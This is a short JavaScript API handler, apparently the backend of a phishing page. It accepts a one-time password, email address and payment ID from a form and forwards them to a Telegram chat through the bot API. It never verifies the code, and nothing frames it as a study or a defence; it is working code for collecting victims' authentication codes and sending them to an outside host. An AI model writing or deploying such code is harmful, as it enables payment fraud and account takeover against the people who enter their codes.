const axios = require('axios');

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { otp, email, paymentId } = req.body;
  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  const message = `
🔐 *OTP Verification* 🔐
--------------------------------
📧 *Email*: ${email}
🔢 *OTP Entered*: \`${otp}\`
🆔 *Payment ID*: ${paymentId}
⏰ *Time*: ${new Date().toISOString()}
--------------------------------
✅ *OTP submitted successfully*
  `;

  try {
    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' }
    );

    res.status(200).json({ ok: true, message: 'OTP sent to Telegram.' });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ ok: false, error: 'Failed to send OTP' });
  }
}